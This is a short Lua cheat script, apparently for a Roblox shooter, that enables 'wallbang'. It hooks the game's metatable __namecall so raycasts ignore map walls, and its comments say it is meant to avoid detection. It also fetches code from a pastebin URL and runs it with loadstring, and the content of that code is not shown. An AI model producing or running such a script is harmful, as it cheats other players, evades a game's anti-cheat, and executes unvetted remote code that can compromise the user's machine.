--[[
MADE BY Bolts And The3Bakers and to Andrew for undetection SUPPORT THEM NOT US
]]--

getgenv().Wallbang = true

-- Normal Patch Wallbang

local mt = getrawmetatable(game)
local namecallold = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    local Args = {...}
    NamecallMethod = getnamecallmethod()
    if getgenv().Wallbang and tostring(NamecallMethod) == "FindPartOnRayWithIgnoreList" then
        table.insert(Args[2], workspace.Map)
    end
    return namecallold(self, ...)
end)
-- WALLBANG BYPASS
loadstring(game:HttpGet("https://pastebin.pl/view/raw/93ee6b4f", true))() -- credits to bolts and the 3 bakers and Finny for this
setreadonly(mt, true)
